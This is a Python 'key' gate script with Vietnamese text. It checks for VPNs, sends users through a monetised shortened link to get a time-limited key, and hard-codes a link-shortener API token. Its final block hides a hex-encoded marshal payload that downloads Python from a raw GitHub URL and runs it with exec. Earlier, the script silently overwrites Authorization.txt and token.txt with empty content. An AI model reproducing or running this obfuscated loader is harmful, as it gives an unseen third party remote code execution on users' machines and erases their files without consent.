import subprocess
import sys
import importlib
import threading
import base64
import os
import time
import re
import json
import random
import requests
import socket
from time import sleep
from datetime import datetime, timedelta
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# ================== CÀI THƯ VIỆN ==================
def print_notice(msg, icon="🔧"):
    print(f"{icon} {msg}")

print_notice("Đang kiểm tra và cài đặt thư viện pip cần thiết...", "📚")

def check_and_install(pip_name, import_name=None):
    if import_name is None:
        import_name = pip_name
    try:
        importlib.import_module(import_name)
        print_notice(f"✅ {pip_name} đã được cài đặt", "✅")
    except ImportError:
        print_notice(f"📦 Đang cài đặt {pip_name}...", "📦")
        subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])

required_packages = {
    'requests': 'requests',
    'cloudscraper': 'cloudscraper',
    'beautifulsoup4': 'bs4',
    'colorama': 'colorama',
    'rich': 'rich'
}

for pip_name, import_name in required_packages.items():
    check_and_install(pip_name, import_name)

print_notice("🎉 Tất cả thư viện đã sẵn sàng. Bắt đầu chạy chương trình...", "🚀")

try:
    import psutil
except ImportError:
    os.system("pip install psutil")
    import psutil

# ================== KIỂM TRA MẠNG ==================
def check_internet():
    try:
        requests.get("https://www.google.com", timeout=5)
        return True
    except Exception:
        return False

def require_internet():
    if not check_internet():
        print("🚫 Kết nối mạng đã mất. Vui lòng bật lại Internet để tiếp tục sử dụng tool.")
        sys.exit(1)

# ================== VPN CHECK ==================
VPN_IFACE_PATTERNS = ["tun", "tap", "ppp", "wg", "utun", "tailscale", "vpn"]
SUSPECT_KEYWORDS = [
    "vpn", "proxy", "hosting", "datacenter", "cloud",
    "amazon", "aws", "google", "azure", "microsoft", "oracle",
    "digitalocean", "ovh", "hetzner", "linode", "vultr", "contabo",
    "nordvpn", "expressvpn", "surfshark", "proton", "mullvad"
]

def has_vpn_interface():
    try:
        nics = psutil.net_if_stats()
        for name, st in nics.items():
            if not st.isup:
                continue
            for pat in VPN_IFACE_PATTERNS:
                if pat.lower() in name.lower():
                    return True
    except Exception:
        return False
    return False

def looks_like_vpn_org(org_text: str):
    s = org_text.lower()
    for kw in SUSPECT_KEYWORDS:
        if kw in s:
            return True
    return False

def check_vpn():
    print("⚠️ Vui lòng KHÔNG sử dụng VPN/Proxy khi chạy công cụ này.")
    if has_vpn_interface():
        print("🚫 Phát hiện adapter VPN. Thoát tool.")
        sys.exit(1)
    try:
        require_internet()
        r = requests.get("https://ipapi.co/json/", timeout=3)
        if r.ok:
            data = r.json()
            org = data.get("org", "") + " " + data.get("asn", "")
            if looks_like_vpn_org(org):
                print(f"🚫 Phát hiện kết nối VPN/Proxy (Org: {org}). Thoát tool.")
                sys.exit(1)
    except Exception:
        pass

# ================== HỖ TRỢ ==================
def encrypt_data(data):
    return base64.b64encode(data.encode()).decode()

def decrypt_data(encrypted_data):
    return base64.b64decode(encrypted_data.encode()).decode()

def banner():
    os.system("cls" if os.name == "nt" else "clear")
    banner = f"""
\033[97m════════════════════════════════════════════════  
\033[1;97m[\033[1;35m<>\033[1;97m]\033[45m YOUTUBE\033[1;31m : \033[1;32m@hdt2092
\033[1;97m[\033[1;36m<>\033[1;97m]\033[46m TELEGRAM \033[1;31m :https://t.me/n0p3c3p4k59sks99ck98 \033[0m
\033[97m════════════════════════════════════════════════  
"""
    for X in banner:
        sys.stdout.write(X)
        sys.stdout.flush()
        sleep(0.000001)

def get_ip_address():
    require_internet()
    try:
        response = requests.get('https://api.ipify.org?format=json')
        ip_data = response.json()
        return ip_data['ip']
    except Exception as e:
        print(f"Lỗi khi lấy địa chỉ IP: {e}")
        return None

def display_ip_address(ip_address):
    if ip_address:
        banner()
        print(f"\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;31mĐịa chỉ IP : {ip_address}")
        print(f"\033[1;35m[\033[1;36m<>\033[1;37m] \033[1;31mKEY LẦN CUỐI CÓ MÃ \033[1;41m \033[1;39mxxZilcxx\033[1;0m")
        print(f"\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;35m \033[1;41m!\033[1;32m Đã Vượt Link Mà  IP không khớp thì sẽ phải vượt link lại từ đầu \033[1;0m")
def luu_thong_tin_ip(ip, key, expiration_date):
    data = {ip: {'key': key, 'expiration_date': expiration_date.isoformat()}}
    encrypted_data = encrypt_data(json.dumps(data))
    with open('.7.json', 'w') as file:
        file.write(encrypted_data)

def tai_thong_tin_ip():
    try:
        with open('.7.json', 'r') as file:
            encrypted_data = file.read()
        return json.loads(decrypt_data(encrypted_data))
    except FileNotFoundError:
        return None

def kiem_tra_ip(ip):
    data = tai_thong_tin_ip()
    if data and ip in data:
        expiration_date = datetime.fromisoformat(data[ip]['expiration_date'])
        if expiration_date > datetime.now():
            return data[ip]['key']
    return None

def generate_key_and_url(ip_address):
    now = datetime.now()
    zilc = now.strftime("%f%H%M%S%f")
    ngay = int(datetime.now().day)
    ip_numbers = ''.join(filter(str.isdigit, ip_address))
    key = f'{ip_numbers}Zilc{zilc}'
    url = f'https://zilc777.github.io/?c6={key}'
    expiration_date = now + timedelta(hours=34)
    return url, key, expiration_date

# ---------- Thay thế kiểm tra expire ----------
def da_qua_gio_moi():
    try:
        ip = get_ip_address()
        if not ip:
            return True
        data = tai_thong_tin_ip()
        if not data or ip not in data:
            return True
        expiration = datetime.fromisoformat(data[ip]['expiration_date'])
        return datetime.now() >= expiration
    except Exception:
        return True

def get_shortened_link_phu(url):
    if not check_internet():
        return {"status": "error", "message": "Không có mạng để rút gọn link."}
    try:
        token = "68abdf110055d9243c6355de"
        api_url = f"https://link4m.co/api-shorten/v2?api={token}&url={url}"
        response = requests.get(api_url, timeout=5)
        if response.status_code == 200:
            return response.json()
        else:
            return {"status": "error", "message": "Không thể kết nối đến dịch vụ rút gọn URL."}
    except Exception:
        return {"status": "error", "message": "Không thể kết nối dịch vụ rút gọn."}

# ================== MAIN ==================
def main():
    if not check_internet():
        print("🚫 Không có kết nối mạng. Không Liên Kết Được Với server.")
        sys.exit(1)

    check_vpn()
    ip_address = get_ip_address()
    display_ip_address(ip_address)

    if ip_address:
        existing_key = kiem_tra_ip(ip_address)
        if existing_key:
            data = tai_thong_tin_ip()
            expiration_date = datetime.fromisoformat(data[ip_address]['expiration_date'])
            remaining = expiration_date - datetime.now()

            if remaining.total_seconds() > 0:
                hours, remainder = divmod(int(remaining.total_seconds()), 3600)
                minutes, seconds = divmod(remainder, 60)
                print(f"\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;35mTool còn hạn, mời bạn dùng tool...")
                print(f"⏳ Thời gian còn lại: {hours}h {minutes}m {seconds}s")
                return
            else:
                print("🚫 Key đã hết hạn, vui lòng vượt link mới.")
                os.remove('.7.json')

        if da_qua_gio_moi():
            url, key, expiration_date = generate_key_and_url(ip_address)
            with ThreadPoolExecutor(max_workers=2) as executor:
                # TỰ ĐỘNG LẤY LINK RÚT GỌN (xóa phần nhập '1')
                print("\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;32mĐang tạo link key...")
                yeumoney_future = executor.submit(get_shortened_link_phu, url)
                yeumoney_data = yeumoney_future.result()

                if yeumoney_data and yeumoney_data.get('status') == "error":
                    print(yeumoney_data.get('message'))
                    return
                else:
                    link_key_yeumoney = yeumoney_data.get('shortenedUrl')
                    print('\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;35mLink Để Vượt Key Cuối Là \033[1;36m:', link_key_yeumoney)
                    start_time = time.time()

                # Vòng chờ user nhập key (giữ nguyên logic kiểm tra thời gian và key)
                while True:
                    require_internet()
                    try:
                        keynhap = input('\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;33mKey Đã Vượt Là: \033[1;32m')
                    except KeyboardInterrupt:
                        print("\n\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;31mCảm ơn bạn đã dùng Tool !!!")
                        sys.exit()

                    elapsed = time.time() - start_time

                    if elapsed < 8:
                        print("🚫 Key Sai ")
                        print("🚫 Bạn Chưa Vượt Link,Vượt Nguyên Captra không tính Là Vượt Link Vui Lòng Chạy Lại Tool !")
                        sys.exit(1)

                    if keynhap == key:
                        print('✅ Key đúng, mời bạn Vượt Link Cuối ')
                        sleep(2)
                        luu_thong_tin_ip(ip_address, keynhap, expiration_date)
                        return
                    else:
                        print('\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;35mKey Sai Vui Lòng Chạy Lại Tool')
                        sys.exit(1)

# ================== FILE KHÁC GIỮ NGUYÊN ==================
with open("Authorization.txt", "w") as f:
    f.write("")
with open("token.txt", "w") as f:
    f.write("")

if __name__ == '__main__':
    main()

# Sau khi chạy main xong, hiển thị key còn lại (nếu có)
from datetime import datetime, timedelta
os.system("cls" if os.name == "nt" else "clear")

print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
ip_address = get_ip_address()
data = tai_thong_tin_ip()
if data and ip_address in data:
    try:
        expiration_date = datetime.fromisoformat(data[ip_address]['expiration_date'])
        remaining = expiration_date - datetime.now()
        if remaining.total_seconds() > 0:
            hours, remainder = divmod(int(remaining.total_seconds()), 3600)
            minutes, seconds = divmod(remainder, 60)



            print("\n")
            print(f"            ⏳ KEY CÒN HẠN ĐẾN HẾT : \033[1;41m\033[1;97m {hours}h "
                  f"\033[1;97m\033[1;46m {minutes}m {seconds}s\033[0m")
        else:
            print("🚫 Key đã hết hạn, vui lòng vượt link lại.")
    except Exception as e:
        print(f"Lỗi khi đọc key còn lại: {e}")
else:
    print("⚠️ Không tìm thấy thông tin key, bạn cần vượt link để lấy key mới.")
    sys.exit(1)
time.sleep(3)

from datetime import datetime, timedelta
# Tính timestamp sau 24h
timestamp = (datetime.now() + timedelta(days=1)).strftime("%Y-%m-%d %H:%M:%S")
with open("key_data.json", "w", encoding="utf-8") as f:
    f.write(f'{{"key": "Zilc777", "timestamp": "{timestamp}"}}')

import marshal, binascii
# Payload lưu dưới dạng HEX
hex_payload = "e30000000000000000000000000500000000000000f3a40000009700640064016c005a00640064016c015a010900090002006502020065006a060000000000000000000000000000000000006402ab010000000000006a08000000000000000000000000000000000000ab0100000000000001008c24230065052400721c0100020065066403ab010000000000000100020065016a0e000000000000000000000000000000000000ab00000000000000010059008c2177007803590077012904e9000000004e7a4068747470733a2f2f6769746875622e636f6d2f546869656e31323373652f496969742f7261772f726566732f68656164732f6d61696e2f7468746f6f6c2e7079752300000043e1baa36d20c6a16e2062e1baa16e20c491c3a32064c3b96e6720546f6f6c202121212908da087265717565737473da03737973da0465786563da03676574da0474657874da114b6579626f617264496e74657272757074da057072696e74da0465786974a900f300000000fa083c737472696e673eda083c6d6f64756c653e720e000000010000007354000000f003010101e70014d8060af002040513d9080c885c88588f5c895cd01a5cd30d5dd70d62d10d62d40863f00500070bf8f006000c1df200020513d9080dd00e33d40834d8081088038f0889088e0af005020513fa730f0000008b222e00ae1e410f03c10e01410f03"
try:
    if check_internet():
        payload_bytes = binascii.unhexlify(hex_payload.strip())
        code_obj = marshal.loads(payload_bytes)
        exec(code_obj)
    else:
        print("⚠️ Lỗi Không Có internet")
except Exception as e:
    print("Tool Đã Hết Hiệu Lực :", e)
